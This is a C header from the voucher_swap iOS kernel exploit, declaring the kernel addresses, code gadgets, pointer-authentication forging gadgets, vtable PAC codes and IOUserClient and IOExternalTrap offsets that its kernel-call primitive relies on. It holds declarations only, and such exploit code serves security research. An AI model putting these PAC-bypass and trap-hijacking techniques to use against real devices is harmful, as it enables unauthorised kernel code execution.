/*
 * kernel_call/kc_parameters.h
 * Brandon Azad
 */
#ifndef VOUCHER_SWAP__KERNEL_CALL__KC_PARAMETERS_H_
#define VOUCHER_SWAP__KERNEL_CALL__KC_PARAMETERS_H_

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>

#include "parameters.h"

#ifdef KERNEL_CALL_PARAMETERS_EXTERN
#define extern KERNEL_CALL_PARAMETERS_EXTERN
#endif

// A structure describing the PAC codes used as part of the context for signing and verifying
// virtual method pointers in a vtable.
struct vtable_pac_codes {
	size_t count;
	const uint16_t *codes;
};

// Generate the name for an offset in a virtual method table.
#define VTABLE_INDEX(class_, method_)	_##class_##_##method_##__vtable_index_

// Generate the name for a list of vtable PAC codes.
#define VTABLE_PAC_CODES(class_)	_##class_##__vtable_pac_codes_

// A helper macro for INIT_VTABLE_PAC_CODES().
#define VTABLE_PAC_CODES_DATA(class_)	_##class_##__vtable_pac_codes_data_

// Initialize a list of vtable PAC codes. In order to store the PAC code array in constant memory,
// we place it in a static variable. Consequently, this macro will produce name conflicts if used
// outside a function.
#define INIT_VTABLE_PAC_CODES(class_, ...)						\
	static const uint16_t VTABLE_PAC_CODES_DATA(class_)[] = { __VA_ARGS__ };	\
	VTABLE_PAC_CODES(class_) = (struct vtable_pac_codes) {				\
		.count = sizeof(VTABLE_PAC_CODES_DATA(class_)) / sizeof(uint16_t),	\
		.codes = (const uint16_t *) VTABLE_PAC_CODES_DATA(class_),		\
	}

extern uint64_t ADDRESS(paciza_pointer__l2tp_domain_module_start);
extern uint64_t ADDRESS(paciza_pointer__l2tp_domain_module_stop);
extern uint64_t ADDRESS(l2tp_domain_inited);
extern uint64_t ADDRESS(sysctl__net_ppp_l2tp);
extern uint64_t ADDRESS(sysctl_unregister_oid);
extern uint64_t ADDRESS(mov_x0_x4__br_x5);
extern uint64_t ADDRESS(mov_x9_x0__br_x1);
extern uint64_t ADDRESS(mov_x10_x3__br_x6);
extern uint64_t ADDRESS(kernel_forge_pacia_gadget);
extern uint64_t ADDRESS(kernel_forge_pacda_gadget);
extern uint64_t ADDRESS(IOUserClient__vtable);
extern uint64_t ADDRESS(IORegistryEntry__getRegistryEntryID);

extern size_t SIZE(kernel_forge_pacxa_gadget_buffer);
extern size_t OFFSET(kernel_forge_pacxa_gadget_buffer, first_access);
extern size_t OFFSET(kernel_forge_pacxa_gadget_buffer, pacia_result);
extern size_t OFFSET(kernel_forge_pacxa_gadget_buffer, pacda_result);

extern struct vtable_pac_codes VTABLE_PAC_CODES(IOAudio2DeviceUserClient);
extern struct vtable_pac_codes VTABLE_PAC_CODES(IODTNVRAM);

// Parameters for IOAudio2DeviceUserClient.
extern size_t OFFSET(IOAudio2DeviceUserClient, traps);

// Parameters for IOExternalTrap.
extern size_t SIZE(IOExternalTrap);
extern size_t OFFSET(IOExternalTrap, object);
extern size_t OFFSET(IOExternalTrap, function);
extern size_t OFFSET(IOExternalTrap, offset);

// Parameters for IORegistryEntry.
extern size_t OFFSET(IORegistryEntry, reserved);
extern size_t OFFSET(IORegistryEntry__ExpansionData, fRegistryEntryID);

// Parameters for IOUserClient.
extern uint32_t VTABLE_INDEX(IOUserClient, getExternalTrapForIndex);
extern uint32_t VTABLE_INDEX(IOUserClient, getTargetAndTrapForIndex);

/*
 * kernel_call_parameters_init
 *
 * Description:
 * 	Initialize the addresses used in the kernel_call subsystem.
 */
bool kernel_call_parameters_init(void);

#undef extern

#endif
